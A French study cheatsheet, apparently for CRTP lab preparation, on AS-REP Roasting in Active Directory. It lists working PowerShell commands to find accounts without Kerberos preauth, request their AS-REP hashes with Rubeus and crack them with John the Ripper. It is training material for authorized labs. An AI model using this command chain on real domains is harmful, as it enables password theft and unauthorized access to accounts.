# Cheatsheet - AS-REP Roasting

> [!summary] Objectif
> Repérer les comptes sans preauth Kerberos et récupérer un AS-REP exploitable en lab.

> [!warning] Cadre d'utilisation
> À utiliser uniquement dans un environnement de lab autorisé, dans le cadre de l'apprentissage et de la préparation CRTP.

## Quick use

- `DoesNotRequirePreAuth`
- preauth-disabled users

## Core commands

### Find vulnerable accounts

```powershell
. C:\AD\Tools\PowerView.ps1
Get-DomainUser -PreauthNotRequired -Verbose
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

Le bloc de base du PDF pour repérer les comptes concernés.

### Request AS-REP

```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args asreproast /user:VPN1user /outfile:C:\AD\Tools\asrephashes.txt
```

Commande alignée sur l’exemple `VPN1user` du support.

### Crack from the PDF

```powershell
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe -wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt
```

Étape de crack montrée juste après la collecte.

## PDF notes

- Le workflow est très court : enumerate -> request -> crack.
- Garde le user exact et le fichier de sortie dans tes notes.

## Related

- [[Cheatsheet - Kerberoasting]]
- [[Synthèse - Kerberos]]
- [[Attaques AD - MOC]]

